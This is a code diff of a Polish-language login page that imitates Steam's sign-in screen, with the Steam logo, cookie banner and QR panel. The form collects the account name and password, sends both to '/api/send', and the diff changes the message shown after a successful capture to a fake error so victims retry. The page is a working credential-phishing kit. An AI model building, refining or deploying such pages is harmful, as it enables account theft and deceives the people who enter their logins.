@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Steam</title>
+    <title>Zaloguj się</title>
+    <link rel="icon" type="image/png" href="favicon.png">
     <style>
         * {
             box-sizing: border-box;
@@ -25,18 +26,22 @@
             background-repeat: no-repeat;
             color: #d6d7d8;
         }
-        /* LOGO */
+        /* LOGO – dokładnie w lewym górnym rogu */
         .logo {
             position: fixed;
             top: 0;
             left: 0;
             z-index: 10;
+            margin: 0;
+            padding: 0;
         }
         .logo img {
             width: 184px;
             height: 184px;
             object-fit: contain;
             display: block;
+            margin: 0;
+            padding: 0;
         }
         /* GŁÓWNE OKNO */
         .panel {
@@ -44,8 +49,7 @@
             min-height: 340px;
             display: flex;
             background: #171a21;
-            box-shadow:
-                0 20px 60px rgba(0, 0, 0, 0.55);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.55);
             border-radius: 3px;
             overflow: hidden;
             transform: translateY(-25px);
@@ -89,8 +93,7 @@
         }
         .field input:focus {
             border-color: #67a9d6;
-            box-shadow:
-                0 0 0 1px rgba(103, 169, 214, 0.25);
+            box-shadow: 0 0 0 1px rgba(103, 169, 214, 0.25);
             background: #393e49;
         }
         .field input::placeholder {
@@ -118,25 +121,16 @@
             margin: 19px auto 0;
             border: 0;
             border-radius: 2px;
-            background:
-                linear-gradient(
-                    to right,
-                    #19b9f1,
-                    #2b70f0
-                );
+            background: linear-gradient(to right, #19b9f1, #2b70f0);
             color: white;
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition:
-                transform 0.12s,
-                filter 0.12s,
-                box-shadow 0.12s;
+            transition: transform 0.12s, filter 0.12s, box-shadow 0.12s;
         }
         .submit:hover {
             filter: brightness(1.08);
-            box-shadow:
-                0 5px 18px rgba(20, 150, 240, 0.25);
+            box-shadow: 0 5px 18px rgba(20, 150, 240, 0.25);
             transform: translateY(-1px);
         }
         .submit:active {
@@ -197,11 +191,9 @@
             align-items: center;
             justify-content: center;
         }
-        .qr-box canvas {
-            width: 129px !important;
-            height: 129px !important;
-            image-rendering: pixelated;
-            image-rendering: crisp-edges;
+        .qr-box img {
+            width: 129px;
+            height: 129px;
             display: block;
         }
         .qr-description {
@@ -222,8 +214,7 @@
             background: rgba(23, 26, 33, 0.97);
             border: 1px solid #323843;
             border-radius: 5px;
-            box-shadow:
-                0 15px 45px rgba(0, 0, 0, 0.65);
+            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.65);
             z-index: 100;
             color: #d6d7d8;
         }
@@ -253,12 +244,7 @@
             cursor: pointer;
         }
         .cookie-accept {
-            background:
-                linear-gradient(
-                    to right,
-                    #19b9f1,
-                    #2b70f0
-                );
+            background: linear-gradient(to right, #19b9f1, #2b70f0);
             color: white;
             border: none;
         }
@@ -313,10 +299,11 @@
     </style>
 </head>
 <body>
-    <!-- LOGO -->
+    <!-- LOGO – lewy górny róg -->
     <div class="logo">
         <img src="logo.png" alt="Steam">
     </div>
+
     <!-- GŁÓWNE OKNO -->
     <div class="panel">
         <!-- LEWA STRONA -->
@@ -325,112 +312,63 @@
             <form id="form">
                 <div class="field">
                     <label for="pole1">ZALOGUJ SIĘ Z UŻYCIEM NAZWY KONTA</label>
-                    <input
-                        id="pole1"
-                        type="text"
-                        placeholder="Wpisz tekst..."
-                        autocomplete="off"
-                    >
+                    <input id="pole1" type="text" placeholder="Wpisz tekst..." autocomplete="off">
                 </div>
                 <div class="field">
                     <label for="pole2">HASŁO</label>
-                    <input
-                        id="pole2"
-                        type="text"
-                        placeholder="Wpisz tekst..."
-                        autocomplete="off"
-                    >
+                    <input id="pole2" type="text" placeholder="Wpisz tekst..." autocomplete="off">
                 </div>
                 <label class="remember">
-                    <input
-                        id="remember"
-                        type="checkbox"
-                    >
+                    <input id="remember" type="checkbox">
                     Zapamiętaj mnie
                 </label>
-                <button
-                    class="submit"
-                    type="submit"
-                >
-                    Zaloguj się
-                </button>
-                <a
-                    href="#"
-                    class="help-link"
-                    onclick="return false;"
-                >
-                    Pomocy, nie mogę się zalogować
-                </a>
+                <button class="submit" type="submit">Zaloguj się</button>
+                <a href="#" class="help-link" onclick="return false;">Pomocy, nie mogę się zalogować</a>
                 <div id="status"></div>
             </form>
         </div>
-        <!-- PRAWA STRONA — DEKORACYJNY QR -->
+
+        <!-- PRAWA STRONA — gotowy QR -->
         <div class="qr-section">
-            <div class="qr-title">
-                LUB UŻYJ KODU QR
-            </div>
+            <div class="qr-title">LUB UŻYJ KODU QR</div>
             <div class="qr-box">
-                <canvas id="qrCanvas"></canvas>
+                <img 
+                    src="https://api.qrserver.com/v1/create-qr-code/?size=129x129&data=https://www.youtube.com/watch?v=QDia3e12czc" 
+                    alt="QR Code"
+                    width="129"
+                    height="129"
+                >
             </div>
             <div class="qr-description">
-                Użyj aplikacji mobilnej steam,
+                Użyj aplikacji mobilnej steam,<br>
                 aby zeskanować kod QR.
             </div>
         </div>
     </div>
+
     <!-- POPUP -->
-    <div
-        class="cookie-popup"
-        id="cookiePopup"
-    >
+    <div class="cookie-popup" id="cookiePopup">
         <div class="cookie-title">
-            Czy zgadzasz się na korzystanie przez nas
-            z opcjonalnych ciasteczek?
+            Czy zgadzasz się na korzystanie przez nas z opcjonalnych ciasteczek?
         </div>
         <p class="cookie-text">
             Czy zgadzasz się na korzystanie przez nas z opcjonalnych
             ciasteczek w celu dostarczania ci spersonalizowanych treści
             oraz analizowania ruchu sieciowego na stronie?
             <br><br>
-            Nie używamy wielu detali. Możesz zobaczyć je i zarządzać nimi
-            w dowolnej chwili na stronie steam.
+            Nie używamy wielu ciasteczek. Możesz zobaczyć je i zarządzać nimi
+            w dowolnej chwili na stronie.
             Jeżeli klikniesz „Zaakceptuj wszystkie”, będzie to oznaczało
-            wyrażenie zgody na używanie opcjonalnych danych na stronach Steam.
+            wyrażenie zgody na używanie opcjonalnych danych na stronach steam.
             Dowiedz się więcej na temat ciasteczek na naszej stronie.
         </p>
         <div class="cookie-buttons">
-            <button
-                class="cookie-button cookie-reject"
-                id="rejectCookies"
-            >
-                Odrzuć wszystkie
-            </button>
-            <button
-                class="cookie-button cookie-accept"
-                id="acceptCookies"
-            >
-                Zaakceptuj wszystkie
-            </button>
+            <button class="cookie-button cookie-reject" id="rejectCookies">Odrzuć wszystkie</button>
+            <button class="cookie-button cookie-accept" id="acceptCookies">Zaakceptuj wszystkie</button>
         </div>
     </div>
+
     <script>
- <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
-<script>
-    // Prawdziwy QR prowadzący do YouTube
-    const canvas = document.getElementById("qrCanvas");
-
-    QRCode.toCanvas(canvas, "https://www.youtube.com/watch?v=QDia3e12czc", {
-        width: 129,
-        margin: 1,
-        color: {
-            dark: "#000000",
-            light: "#ffffff"
-        },
-        errorCorrectionLevel: "M"
-    }, function (error) {
-        if (error) console.error(error);
-    });
-
         // Formularz – wysyłanie do serwera
         const form = document.getElementById("form");
         const status = document.getElementById("status");
@@ -455,16 +393,14 @@
             try {
                 const response = await fetch("/api/send", {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ pole1, pole2 })
                 });
 
                 const data = await response.json();
 
                 if (response.ok && data.success) {
-                    status.textContent = "Wysłano pomyślnie!";
+                    status.textContent = "Wystąpił błąd, spróbuj ponownie później.";
                     status.style.color = "#66c0f4";
                     form.reset();
                 } else {
